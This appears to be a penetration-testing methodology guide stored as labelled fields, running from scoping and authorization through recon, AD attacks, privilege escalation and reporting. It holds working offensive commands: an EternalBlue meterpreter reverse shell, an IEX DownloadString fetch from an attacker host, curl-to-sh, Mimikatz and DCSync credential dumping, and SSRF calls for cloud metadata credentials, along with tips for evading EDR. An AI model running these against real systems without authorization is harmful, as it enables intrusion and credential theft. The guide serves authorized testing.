label: Pre-Engagement
desc: Legal, scoping, threat modeling, environment setup

steps.title: Initial Client Meeting
steps.summary: Establish relationship and objectives before any technical work begins.
checklist: Identify stakeholders and primary security contact
Understand business type, industry, and regulatory environment
Discuss prior incidents and previous penetration tests
Identify compliance requirements: PCI-DSS, HIPAA, ISO 27001, SOC 2
Determine testing type: black-box / grey-box / white-box

commands.title: Pre-Meeting OSINT — theHarvester
commands.purpose: Know their tech stack and employees before the meeting
commands.cmd: theHarvester -d {DOMAIN} -b google,bing,linkedin,yahoo,duckduckgo -l 500 -f ~/pentests/{CLIENT}/recon/pre_meeting.html
commands.note: Do this before the meeting. Referencing their tech stack builds instant credibility.
commands.out: Emails, employee names, subdomains, IPs from public sources

commands.title: Shodan Pre-Meeting Recon
commands.purpose: View public attack surface passively before the call
commands.cmd:
shodan search 'org:"{COMPANY}"' --fields ip_str,port,hostnames,vulns
shodan host {IP_ADDRESS}
commands.note: Setup: pip3 install shodan && shodan init YOUR_API_KEY (free at shodan.io)
commands.out: IPs, ports, banners, CVEs — zero contact with their network

steps.deliverable: Meeting notes + initial scope proposal draft
steps.tip: Reference a specific Shodan finding in the meeting. Knowing their exposed RDP before they tell you instantly separates you from junior testers.

steps.title: Legal Authorization & Scope
steps.summary: Every scope item in writing. ALL legal docs signed before touching any system.
checklist: All in-scope IP ranges and CIDR blocks documented and signed
All in-scope domains and subdomains listed
Rules of Engagement (ROE) signed by authorized executive
Written Authorization Letter on company letterhead
Social engineering in/out of scope confirmed

commands.title: Verify IP and Domain Ownership
commands.purpose: Confirm all scope items belong to the client before testing
commands.cmd:
whois {IP_ADDRESS} | grep -E 'OrgName|Organization|NetName|CIDR|NetRange'
whois {DOMAIN} | grep -E 'Registrant|Organization|Admin'
commands.note: Document this output as part of your legal authorization package. Testing systems you don't own is illegal.
commands.out: Organization name, IP block ownership, domain registrant

steps.deliverable: Signed SOW + NDA + ROE + Authorization Letter
steps.tip: Carry the authorization letter at ALL times during testing. If law enforcement contacts you, show it immediately.

steps.title: Environment Setup
steps.summary: Configure attack machine, logging, and project structure before starting.
checklist: Fresh Kali Linux VM on isolated network

commands.title: Project Structure + Terminal Logging
commands.purpose: Organized evidence collection and automatic timestamped command log
commands.note: Run script logging at the start of every session. Every command timestamped = your legal and technical evidence.
commands.out: Organized project directory + timestamped terminal log

commands.title: Update Tools + SecLists
commands.purpose: Start every engagement with current tools and wordlists
commands.cmd:
sudo apt update && sudo apt upgrade -y
sudo apt install -y seclists nmap masscan gobuster ffuf nikto sqlmap hydra crackmapexec impacket-scripts bloodhound neo4j evil-winrm responder
nuclei -update-templates && subfinder -up && httpx -up
commands.example: sudo apt update && sudo apt upgrade -y && sudo apt install -y seclists
commands.note: Key SecLists: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt | /usr/share/wordlists/rockyou.txt
commands.out: All tools updated, SecLists at /usr/share/seclists/

steps.tip: Take a VM snapshot before starting every engagement. Proves your attack machine state and lets you restore cleanly.

steps.title: Passive OSINT
steps.summary: Maximum intelligence without touching target systems. Spend at least 2-3 hours here — completely risk-free.
checklist: DNS record enumeration (A, MX, TXT, NS, SOA, AXFR attempt)
Subfinder passive + httpx probe for live hosts
Google dorks: files, panels, sensitive data
GitHub / GitLab secret scanning (leaked creds, API keys)
LinkedIn + job postings — tech stack discovery

commands.title: DNS + crt.sh + Amass + Subfinder + httpx
commands.purpose: Complete passive subdomain and DNS enumeration pipeline
commands.cmd:
# DNS records:
dnsrecon -d {DOMAIN} -a -o ~/pentests/{CLIENT}/recon/dnsrecon.xml
dig {DOMAIN} ANY +noall +answer

# Certificate transparency:
curl -s 'https://crt.sh/?q=%.{DOMAIN}&output=json' | jq -r '.[].name_value' | sort -u | tee ~/pentests/{CLIENT}/recon/crtsh.txt

# Subdomain enumeration:
amass enum -passive -d {DOMAIN} -o ~/pentests/{CLIENT}/recon/amass.txt
subfinder -d {DOMAIN} -all -recursive -o ~/pentests/{CLIENT}/recon/subfinder.txt

# Merge and probe live hosts:
cat ~/pentests/{CLIENT}/recon/{crtsh,amass,subfinder}.txt | sort -u > all_subs.txt
httpx -l all_subs.txt -title -status-code -tech-detect -o ~/pentests/{CLIENT}/recon/live_hosts.txt
commands.example:
subfinder -d acmecorp.com -all -recursive -o subfinder.txt
httpx -l subfinder.txt -title -status-code -tech-detect -o live_hosts.txt

flags.d: crt.sh: wildcard finds all subdomain certs

commands.note: live_hosts.txt is your web attack surface. Every line is a target. crt.sh often finds staging/dev subdomains forgotten by the client.
commands.out: All live web hosts with status codes, titles, and technology stacks

commands.title: theHarvester + GitHub Secrets
commands.purpose: Email and employee harvest + leaked credential detection
commands.example:
theHarvester -d acmecorp.com -b google,bing,linkedin,crtsh -l 500 -f harvester.html
trufflehog github --org=acmecorp --token=ghp_yourtoken

flags.d: GitHub PAT needed for org scanning

commands.note: Emails = password spray list. GitHub leaked API key = critical finding with zero risk. Always check GitHub before touching their network.
commands.out: Emails, employees (theHarvester) + leaked secrets with file locations (trufflehog)

commands.title: Google Dorks + Shodan + Wayback
commands.purpose: Sensitive data indexed by search engines, passive infra scan, historical URLs
commands.cmd:
# Google dorks (paste one at a time):
site:{DOMAIN} filetype:pdf OR filetype:xlsx OR filetype:docx
site:{DOMAIN} intitle:"index of" -html
site:{DOMAIN} ext:env OR ext:cfg OR ext:bak OR ext:sql
site:{DOMAIN} "password" OR "api_key" OR "credentials"
site:{DOMAIN} inurl:admin OR inurl:login OR inurl:dashboard

# Shodan:
shodan search 'org:"{COMPANY}"' --fields ip_str,port,hostnames,vulns
shodan host {IP_ADDRESS}

# Wayback Machine:
go install github.com/tomnomnom/waybackurls@latest
waybackurls {DOMAIN} | grep -iE '.php|.asp|.env|.sql|.bak|admin|config|backup' | tee wayback.txt
commands.example:
site:acmecorp.com ext:env
shodan search 'org:"Acme Corporation"' --fields ip_str,port,hostnames,vulns
waybackurls acmecorp.com | grep '.env'
commands.note: Full dork DB: exploit-db.com/google-hacking-database (4000+ proven dorks). Old .env files often still accessible at historical URLs.
commands.out: Exposed docs, login panels, directory listings, config files + historical sensitive URLs

steps.deliverable: OSINT Report: assets, emails, subdomains, leaked credentials discovered
steps.tip: A leaked GitHub API key before touching their network = critical finding with zero risk to you. Always start here.

steps.title: Active Reconnaissance
steps.summary: Direct contact with target: port scanning, service detection, web enumeration.
checklist: Live host discovery — ping sweep + TCP fallback
whatweb + wafw00f — tech and WAF fingerprinting

commands.title: Host Discovery + masscan + nmap
commands.purpose: Find all live hosts and services — the core scanning workflow
commands.cmd:
# 1. Host discovery:
nmap -sn -PE -PS21,22,23,80,443,445,3389 -PU53,161 {CIDR} -oA hosts
grep 'Up' hosts.gnmap | awk '{print $2}' > live_ips.txt

# 2. Fast all-port scan:
sudo masscan {CIDR} -p1-65535 --rate=5000 -oG masscan.txt
grep 'open' masscan.txt | awk '{print $4}' | cut -d'/' -f1 | sort -un | paste -sd',' > open_ports.txt

# 3. Deep service scan on discovered ports:
nmap -p $(cat open_ports.txt) -sV -sC -O --min-rate 3000 -T4 -oA nmap_svc {TARGET}
commands.note: WORKFLOW: masscan for speed → extract ports → nmap for accuracy. Never nmap -p- at default speed on /24 (takes hours).
commands.out: All live hosts, open ports, service versions, OS fingerprints

commands.title: UDP Scan + Web Enumeration
commands.purpose: Find UDP services and hidden web directories/VHosts
commands.cmd:
# UDP scan (never skip this):
sudo nmap -sU -F --min-rate 1000 -oA udp_scan {TARGET}

# Web directory brute force:
gobuster dir -u {URL} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,asp,aspx,bak,zip,conf -t 40 -o gobuster.txt

# VHost discovery:
ffuf -u {URL} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs {BASELINE_SIZE}

# Tech + WAF fingerprinting:
whatweb -v {URL} | tee whatweb.txt
wafw00f {URL} -v
commands.example:
sudo nmap -sU -F --min-rate 1000 -oA udp 192.168.1.100
gobuster dir -u https://acmecorp.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,bak -t 40

flags.d: ffuf: filter response size (remove false positives)

commands.note: UDP 161 (SNMP) with 'public' community = routing tables, ARP cache, running processes, full network map.
commands.out: Open UDP services + hidden web paths + virtual hosts + WAF vendor

steps.deliverable: Asset inventory: IPs, ports, services, web apps, technologies
steps.tip: masscan for speed, nmap for accuracy — always this order. SNMP with public community string is still one of the most reliable network information leaks.

label: Scanning
desc: Vulnerability scanning, web app testing, Active Directory enumeration

steps.title: Network Vulnerability Scanning
steps.summary: Automated vuln scans — authenticated finds 3-5x more. Always push for credentials.
checklist: nmap NSE vulnerability scripts on all hosts
SSL/TLS audit: Heartbleed, POODLE, weak ciphers
Manual verify every Critical/High before reporting

commands.title: nmap NSE Vuln Scan + SMB + SSL
commands.purpose: Built-in vulnerability detection — no additional license required
commands.note: EternalBlue (MS17-010) VULNERABLE = call client immediately per emergency escalation. Don't proceed without notification.
commands.out: CVEs, misconfigurations, default credentials, vulnerable service versions

commands.title: testssl.sh + SNMP Enumeration
commands.purpose: Comprehensive SSL audit and full SNMP data extraction
commands.cmd:
# Full SSL audit:
git clone https://github.com/drwetter/testssl.sh && cd testssl.sh
./testssl.sh --html ~/pentests/{CLIENT}/scans/ssl.html {TARGET}:443
./testssl.sh --severity HIGH {TARGET}:443

# SNMP community string brute force:
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {TARGET}

# SNMP full dump:
snmpwalk -v2c -c public {TARGET} . | tee snmp_full.txt
commands.note: Common SSL findings: TLS 1.0/1.1, RC4/3DES ciphers, self-signed cert, Heartbleed. SNMP 'public' = full network topology.
commands.out: SSL vulnerability list + routing tables, processes, software list (SNMP)

steps.deliverable: Validated vulnerability list with CVSS scores
steps.tip: Never report raw scanner output. Verify every Critical/High manually. One false positive = immediate credibility loss.

steps.title: Web Application Testing
steps.summary: OWASP Top 10 — automated baseline then deep manual analysis with Burp Suite.
checklist: SQLi — all input fields and URL params
SSRF — internal service and cloud metadata

commands.title: Nikto + Nuclei + Headers
commands.purpose: Automated baseline scan — run first on every web target
commands.cmd:
# Nikto:
nikto -h {URL} -o nikto.html -Format htm

# Nuclei:
nuclei -update-templates
nuclei -u {URL} -t /root/nuclei-templates/ -severity critical,high,medium -o nuclei.txt -stats
nuclei -u {URL} -t /root/nuclei-templates/cves/ -o nuclei_cves.txt

# Security headers audit:
curl -IsS {URL} | grep -iE 'Content-Security|X-Frame-Options|Strict-Transport|X-Content-Type|Referrer-Policy'
commands.example:
nikto -h https://acmecorp.com -o nikto.html -Format htm
nuclei -u https://acmecorp.com -t /root/nuclei-templates/ -severity critical,high -stats
commands.note: Check /root/nuclei-templates/exposures/ — exposed panels and config files are often instant wins.
commands.out: CVE matches, exposed panels, default creds, misconfigurations, missing security headers

commands.title: SQLMap + Burp Suite Workflow
commands.purpose: SQL injection and comprehensive manual web testing
commands.cmd:
# SQLMap from Burp request file (most reliable):
sqlmap -r burp_request.txt --dbs --batch

# SQLMap direct URL:
sqlmap -u '{URL}?id=1' --dbs --batch -v 1

# Dump table (max 5 rows to prove access):
sqlmap -u '{URL}?id=1' -D {DB} -T {TABLE} --dump --stop 5 --batch

# Burp Suite proxy setup:
# Firefox: Settings -> Network -> Manual Proxy -> 127.0.0.1:8080
# Install Burp CA: browse http://burpsuite -> Download CA -> import in Firefox
# Ctrl+R = Send to Repeater | Ctrl+I = Send to Intruder

# IDOR test in Repeater:
# GET /api/users/1234 -> change to /api/users/1235 -> 200 OK = IDOR
# Auth bypass: {"role":"user"} -> {"role":"admin"}
# SSRF: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

flags.d: Read from Burp saved request file (most reliable)
CRITICAL: 5 rows max — prove access, never dump PII

commands.note: NEVER use --os-shell without explicit written authorization. Proving access = the goal, not extracting all data.
commands.out: Database names, tables, sample rows confirming SQL injection

commands.title: XSS + JWT + WPScan
commands.purpose: JavaScript injection, JWT token attacks, and CMS scanning
commands.cmd: # XSS payloads (use alert(document.domain) — never cookie theft): # # "> xsstrike -u '{URL}?q=FUZZ' --crawl # JWT analysis: pip3 install jwt_tool --break-system-packages python3 jwt_tool.py {JWT_TOKEN} -T python3 jwt_tool.py {JWT_TOKEN} -X a hashcat -m 16500 {JWT_TOKEN} /usr/share/wordlists/rockyou.txt --force # WordPress: wpscan --url {URL} --enumerate ap,at,cb,dbe,u --api-token {TOKEN} -o wpscan.txt
commands.example:
xsstrike -u 'https://acmecorp.com/search?q=FUZZ' --crawl
python3 jwt_tool.py eyJhbGc... -X a
wpscan --url https://acmecorp.com --enumerate ap,at,u --api-token YOUR_TOKEN

flags.d: wpscan: all plugins with vuln data

commands.note: XSS: use alert(document.domain) NOT document.cookie. Prove execution, not steal real cookies.
commands.out: XSS firing in browser + JWT admin access + vulnerable WordPress plugins

steps.deliverable: Web app findings with manual verification: request + response + impact per finding
steps.tip: Never paste scanner HTML into your report. Rewrite each finding with your own manual evidence. The analysis is what clients pay for.

steps.title: Active Directory Enumeration
steps.summary: Full Windows domain enumeration — foundation for all AD attack chains.
checklist: Domain controller and domain name discovery
Password policy retrieval (critical for spray timing)
BloodHound collection and attack path analysis
SMB share enumeration and access testing

commands.title: CrackMapExec AD Enumeration
commands.purpose: Swiss army knife for SMB and Active Directory recon
commands.cmd:
crackmapexec smb {DC_IP} -u '' -p ''
crackmapexec smb {DC_IP} -u {USER} -p '{PASS}' --users | tee ad_users.txt
crackmapexec smb {DC_IP} -u {USER} -p '{PASS}' --groups
crackmapexec smb {RANGE} -u {USER} -p '{PASS}' --shares
crackmapexec smb {DC_IP} -u {USER} -p '{PASS}' --pass-pol

flags.d: Get password policy (critical for spray timing)
Output: you have local admin on that host

commands.note: Save --users output as your spray target list. (Pwn3d!) = local admin.
commands.out: Domain users, groups, shares, password policy

commands.title: BloodHound + ldapdomaindump
commands.purpose: Visual attack path mapping and full LDAP data extraction
commands.cmd:
# BloodHound data collection:
pip3 install bloodhound --break-system-packages
python3 bloodhound.py -d {DOMAIN} -u {USER} -p '{PASS}' -dc {DC_IP} -c all -o ~/pentests/{CLIENT}/scans/bloodhound/
sudo neo4j console && bloodhound &
# Import JSON files -> run 'Shortest Paths to Domain Admins'

# Full LDAP dump to HTML:
ldapdomaindump ldap://{DC_IP} -u '{DOMAIN}\\{USER}' -p '{PASS}' -o ldap/
commands.example:
python3 bloodhound.py -d acme.local -u john.doe -p 'Password123' -dc 192.168.1.10 -c all
ldapdomaindump ldap://192.168.1.10 -u 'ACME\\john.doe' -p 'Password123' -o ldap/

flags.d: Collect: Users, Groups, LocalAdmin, Sessions, ACL, Trusts

commands.note: On Windows domain host: .\\SharpHound.exe -c All --OutputDirectory C:\\Temp
commands.out: Attack graph to Domain Admin (BloodHound) + HTML tables of all AD objects

commands.title: Kerberoasting + AS-REP Roasting
commands.purpose: Get crackable offline hashes — no network alerts generated
commands.cmd:
# Kerberoasting (needs valid credentials):
impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {DC_IP} -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# AS-REP Roasting (no credentials needed for pre-auth disabled accounts):
impacket-GetNPUsers {DOMAIN}/ -usersfile ad_users.txt -no-pass -dc-ip {DC_IP} -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force

flags.d: Request actual TGS tickets (not just list SPNs)

commands.note: Service accounts with SPNs often have elevated AD privileges. One cracked service account can equal Domain Admin directly.
commands.out: Crackable hash files — offline cracking with zero network alerts

steps.deliverable: AD enumeration with BloodHound attack path screenshots
steps.tip: BloodHound 'Shortest Paths to Domain Admins' is the most impactful report visual. A 3-hop graph to DA explains the risk instantly to any audience.

label: Exploitation
desc: Controlled, documented exploitation — prove impact, cause zero harm

steps.title: Web Application Exploitation
steps.summary: Exploit confirmed vulnerabilities with benign, documented proof-of-concept only.
checklist: SQLi — DB structure + max 5 sample rows
XSS — alert(document.domain) only, never cookie theft
SSRF — reach cloud metadata or internal service
JWT — algorithm confusion or weak secret cracking

commands.title: SQLMap Full Exploitation
commands.purpose: Prove SQL injection with controlled data extraction
commands.cmd:
# Most reliable — from Burp saved request:
sqlmap -r burp_request.txt --dbs --batch

# Direct URL:
sqlmap -u '{URL}?id=1' --dbs --batch -v 1

# Dump table (5 rows max):
sqlmap -u '{URL}?id=1' -D {DB} -T {TABLE} --dump --stop 5 --batch

# SSRF test payloads:
curl '{URL}?url=http://169.254.169.254/latest/meta-data/'
curl '{URL}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl '{URL}?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google'

flags.d: CRITICAL: 5 rows max — never dump full PII

commands.note: AWS IAM creds at /iam/security-credentials/{role} = usable worldwide. Screenshot = instant critical finding.
commands.out: DB structure + sample rows (SQLi) | Cloud IAM creds (SSRF) | Unauthorized data (IDOR)

commands.title: XSS + Auth Bypass + JWT
commands.purpose: JavaScript execution, authentication bypass, JWT token exploitation
commands.cmd: # XSS automated scan: xsstrike -u '{URL}?q=FUZZ' --crawl # Manual XSS payloads: # # "> #
commands.note: XSS: alert(document.domain) proves JS execution without stealing real user cookies from a live session.
commands.out: JS executing in browser + admin access via auth bypass + JWT takeover

steps.deliverable: Exploitation evidence per finding: request + response + business impact + screenshot
steps.tip: Prove impact, cause zero harm. 5 DB rows not 5000. alert(1) not cookie theft. The capability screenshot is everything.

steps.title: Network + AD Exploitation
steps.summary: Credential attacks, CVE exploitation, and full Active Directory attack chain.
checklist: Default/weak credentials on ALL services (SSH, FTP, RDP, databases)

commands.title: Hydra + CrackMapExec Spraying
commands.purpose: Credential attacks across network services and AD
commands.cmd:
# SSH brute force:
hydra -l {USER} -P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt ssh://{TARGET} -t 4

# HTTP form:
hydra -L users.txt -P passwords.txt {TARGET} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid' -t 4

# Password spray (one password, many users — avoids lockout):
crackmapexec smb {RANGE} -u ad_users.txt -p 'Password1!' --continue-on-success

# Pass-the-Hash:
crackmapexec smb {RANGE} -u Administrator -H {NTLM_HASH} --continue-on-success
commands.example:
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt ssh://192.168.1.100 -t 4
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Welcome123!' --continue-on-success

flags.d: 4 threads — keep low to avoid lockouts

commands.note: Check password lockout policy BEFORE spraying. One password per observation window is the safe limit.
commands.out: Valid credentials | (Pwn3d!) = local admin

commands.title: Metasploit + Responder + DCSync
commands.purpose: CVE exploitation, NTLMv2 capture, and domain hash extraction
commands.cmd:
# Metasploit workflow:
msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS {TARGET} && run
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS {TARGET} && set LHOST {YOUR_IP}
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp && exploit

# Meterpreter:
meterpreter > sysinfo && getuid && screenshot && hashdump

# Responder:
sudo responder -I eth0 -wvF
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2*.txt /usr/share/wordlists/rockyou.txt --force

# DCSync (requires Domain Admin):
impacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP}
impacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP} -just-dc-user krbtgt
commands.note: krbtgt hash from DCSync = Golden Ticket capability. Screenshot immediately — this is the crown jewel finding.
commands.out: Meterpreter shell + cracked NTLMv2 (Responder) + all domain hashes (DCSync)

steps.deliverable: Exploitation log: timestamps, commands, systems accessed, credentials found
steps.tip: Document as you go, not from memory later. Keep CherryTree open and paste commands + output in real time.

label: Post-Exploitation
desc: Privilege escalation, credential dumping, lateral movement, cleanup

steps.title: Linux Privilege Escalation
steps.summary: Escalate from low-privilege shell to root using automated scans and manual techniques.
checklist: Search credentials in configs and shell history

commands.title: LinPEAS + sudo -l + SUID Hunt
commands.purpose: Automated and manual Linux privilege escalation
commands.cmd:
# LinPEAS (no file on disk):
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or download + save output:
python3 -m http.server 8000  # on attacker
wget http://{YOUR_IP}:8000/linpeas.sh -O /tmp/.lp && chmod +x /tmp/.lp
/tmp/.lp | tee /tmp/.out.txt

# sudo -l + GTFOBins exploits:
sudo -l
sudo vim -c ':!bash'
sudo python3 -c 'import os;os.system("/bin/bash")'
sudo find / -exec /bin/bash \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'

# SUID binary hunt:
find / -perm -u=s -type f 2>/dev/null
# Check EACH at: gtfobins.github.io -> SUID section
commands.example:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
sudo -l  # then check gtfobins.github.io for each binary found

flags.d: SUID bit set — runs as file owner

commands.note: LinPEAS color code: Bright Red/Yellow = HIGH probability. Focus there. Check every sudo binary at gtfobins.github.io.
commands.out: Color-coded PrivEsc vectors + root shell via sudo/SUID exploitation

commands.title: Credential Hunting on Linux
commands.purpose: Find cleartext passwords in configs, history, environment
commands.cmd:
# Search config files:
grep -ria 'password\|passwd\|secret\|api_key\|db_pass' /var/www/ /opt/ /home/ /etc/ 2>/dev/null | grep -v '.pyc'

# Shell history:
cat ~/.bash_history ~/.zsh_history 2>/dev/null

# Environment variables:
env | grep -iE 'pass|secret|key|token|api'

# Common config files:
find / -name '.env' -o -name 'wp-config.php' -o -name 'database.yml' 2>/dev/null | xargs grep -l 'password' 2>/dev/null
commands.note: wp-config.php and .env files are goldmines. Always check the web document root and /opt/.
commands.out: Cleartext credentials in config files, history, and environment variables

steps.deliverable: PrivEsc chain: low-priv to root with each step documented and screenshot
steps.tip: LinPEAS colors are everything. Bright red = test first. One sudo rule or SUID binary is all you need to get root.

steps.title: Windows Privilege Escalation
steps.summary: Escalate from low-privilege user to SYSTEM on Windows.
checklist: Unquoted service paths and weak service permissions

commands.title: WinPEAS + SeImpersonatePrivilege
commands.purpose: Automated scan and instant SYSTEM via token privilege abuse
commands.cmd:
# Transfer and run WinPEAS:
python3 -m http.server 8000  # on attacker
certutil -urlcache -f http://{YOUR_IP}:8000/winPEASx64.exe C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe | Out-File C:\Windows\Temp\wp.txt

# Check token privileges:
whoami /priv

# SeImpersonatePrivilege present? -> Instant SYSTEM:
PrintSpoofer64.exe -i -c cmd
GodPotato.exe -cmd 'cmd /c whoami'

# PowerUp.ps1 automated checks:
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://{YOUR_IP}:8000/PowerUp.ps1'); Invoke-AllChecks"
commands.example:
certutil -urlcache -f http://192.168.1.50:8000/winPEASx64.exe wp.exe && wp.exe
whoami /priv  # look for SeImpersonatePrivilege

flags.d: PrintSpoofer: command to run as SYSTEM

commands.note: SeImpersonatePrivilege is extremely common on IIS, SQL Server, and other service accounts. PrintSpoofer works 95% of the time.
commands.out: WinPEAS color-coded findings + instant SYSTEM shell via PrintSpoofer

commands.title: Mimikatz + secretsdump
commands.purpose: Extract credentials from Windows memory and remote SAM/NTDS
commands.cmd:
# Mimikatz (local):
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /user:krbtgt

# Remote dump via Impacket (no file on target — stealthier):
impacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{TARGET_IP}
impacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP} -just-dc-user krbtgt
commands.note: Defender catches mimikatz.exe. Use impacket-secretsdump remotely — no file on target, much stealthier.
commands.out: Plaintext passwords or NTLM hashes for all logged-on accounts

steps.deliverable: Windows PrivEsc chain: low-priv to SYSTEM with commands and screenshots
steps.tip: Always run whoami /priv first. SeImpersonatePrivilege + PrintSpoofer = SYSTEM in 10 seconds — most reliable Windows privesc.

steps.title: Lateral Movement + Cleanup
steps.summary: Move through the network and remove ALL testing artifacts before closing.
checklist: Chisel SOCKS proxy for network pivoting
Timestamped proof-of-access file on each system
Remove ALL uploaded tools and files

commands.title: Evil-WinRM + Impacket + Chisel
commands.purpose: Remote shells, lateral movement, and network pivoting
commands.note: Always start with wmiexec — fewest traces. psexec creates a Windows service and is caught by most EDR solutions.
commands.out: Interactive remote shell + SOCKS5 proxy at 127.0.0.1:1080

commands.title: Proof of Access + Cleanup + Archive
commands.purpose: Create timestamped evidence and remove all testing artifacts
commands.cmd:
# Proof of access (Linux):
echo -e "PENTEST PROOF\nClient: {CLIENT}\nDate: $(date)\nHost: $(hostname)\nUser: $(whoami)" > /tmp/PENTEST_PROOF.txt
cat /tmp/PENTEST_PROOF.txt

# Proof of access (Windows CMD):
echo PENTEST PROOF - {CLIENT} - %DATE% %TIME% > C:\Users\Public\PENTEST_PROOF.txt
hostname >> C:\Users\Public\PENTEST_PROOF.txt && whoami >> C:\Users\Public\PENTEST_PROOF.txt

# Cleanup Linux:
rm -f /tmp/.lp /tmp/.out.txt /tmp/chisel /tmp/PENTEST_PROOF*.txt

# Cleanup Windows:
del /f /q C:\Windows\Temp\*.exe C:\Users\Public\PENTEST_PROOF.txt

# Archive evidence:
tar czf ~/pentests/{CLIENT}_evidence.tar.gz ~/pentests/{CLIENT}/
gpg --symmetric --cipher-algo AES256 ~/pentests/{CLIENT}_evidence.tar.gz
commands.note: Screenshot the proof file + whoami together. Notify client of file location for them to verify and delete.
commands.out: Timestamped proof file + clean systems + encrypted evidence archive

steps.deliverable: Lateral movement map + cleanup verification + encrypted evidence archive
steps.tip: Draw the path: [Attacker] -> [Host A] -> [Host B] -> [DC]. A diagram communicates lateral movement instantly — text takes paragraphs.

label: Reporting
desc: CVSS scoring, professional report writing, encrypted delivery

steps.title: CVSS Scoring + Finding Structure
steps.summary: Score every finding objectively. Identical structure for every finding, every time.
checklist: CVSS v3.1 score for every finding

commands.title: CVSS v3.1 Reference
commands.purpose: Objective, consistent risk scoring for all findings
commands.cmd:
# CVSS v3.1 Vector format:
CVSS:3.1/AV:{AV}/AC:{AC}/PR:{PR}/UI:{UI}/S:{S}/C:{C}/I:{I}/A:{A}

# Attack Vector (AV):    N=Network, A=Adjacent, L=Local, P=Physical
# Attack Complexity (AC): L=Low, H=High
# Privileges Required (PR): N=None, L=Low, H=High
# User Interaction (UI): N=None, R=Required
# Scope (S):             U=Unchanged, C=Changed
# Confidentiality (C):   H=High, L=Low, N=None
# Integrity (I):         H=High, L=Low, N=None
# Availability (A):      H=High, L=Low, N=None

# Example: Unauthenticated SQLi -> full DB access
# CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1 CRITICAL

# Calculator: nvd.nist.gov/vuln-metrics/cvss/v3-calculator
commands.note: Score the raw vulnerability. WAF/compensating controls do not reduce CVSS base score — note them separately.
commands.out: Numerical score 0.0-10.0 with Critical/High/Medium/Low label

commands.title: Report Structure + Encrypted Delivery
commands.purpose: Standard report structure and secure delivery procedure
commands.cmd:
# REQUIRED SECTIONS:
# 1. Cover Page (client logo, CONFIDENTIAL, version)
# 2. Table of Contents
# 3. Executive Summary (1-2 pages, non-technical)
#    - Overall risk rating
#    - Finding counts by severity
#    - Top 3 risks in plain business language
#    - 3 immediate action items
# 4. Engagement Overview (scope, methodology, dates)
# 5. Attack Narrative (story: zero to Domain Admin)
# 6. Findings (Title, CVSS, CWE, ATT&CK, Evidence, Impact, Remediation)
# 7. Remediation Roadmap (P1: 7 days, P2: 30 days, P3: 90 days)
# 8. Positive Observations
# 9. Appendix (raw tool output, command log)

# Encrypt delivery:
qpdf --encrypt {PASSWORD} {PASSWORD} 256 -- report.pdf report_enc.pdf
zip -e --password '{PASSWORD}' delivery.zip report.pdf
# Send: file via email, password via SMS/Signal (separate channel)
commands.note: NEVER email an unencrypted report. Always separate channels for file and password.
commands.out: Professional report + encrypted PDF ready for delivery

steps.deliverable: Encrypted final report + executive presentation deck
steps.tip: Business impact is everything. 'Unauthenticated RCE' means nothing to a CEO. 'An attacker can take full control of all servers in minutes with no credentials' does.

label: Re-test
desc: Verify remediations, issue attestation, close engagement professionally

steps.title: Remediation Verification + Closure
steps.summary: Re-test every finding after remediation window. Incomplete patches are extremely common.
checklist: Re-test all Critical and High findings
Re-test Medium/Low that client claims fixed
Verify patches correctly applied (not just partial)
Delete ALL client credentials from your systems

commands.title: Re-test Core Vulnerabilities
commands.purpose: Verify that remediations actually fix the identified vulnerabilities
commands.cmd:
# Re-test SQLi (should return 'not injectable'):
sqlmap -u '{URL}?id=1' --dbs --batch -v 1
curl -s '{URL}?id=1 OR 1=1' | grep -ic 'error\|sql\|syntax'

# Re-test brute force protection:
for i in $(seq 1 6); do curl -s -d 'user=admin&pass=wrongpass' {URL}/login | grep -c 'lock\|too many'; done

# Always test EXACT same attack that worked before
# Document: [BEFORE screenshot] vs [AFTER screenshot] side-by-side
commands.note: Show ORIGINAL vulnerable response and NEW fixed response side-by-side. The contrast IS the proof of remediation.
commands.out: 'Not injectable' / 'Attack fails' confirming fix OR continued vulnerability

commands.title: Attestation Letter + Credential Purge
commands.purpose: Formal compliance letter and secure credential removal from your systems
commands.cmd:
# ATTESTATION LETTER FORMAT (on company letterhead):
# To Whom It May Concern:
# [YOUR COMPANY] performed a professional penetration test on behalf
# of [CLIENT NAME] between [START DATE] and [END DATE].
# Scope: [IP ranges, domains, network]
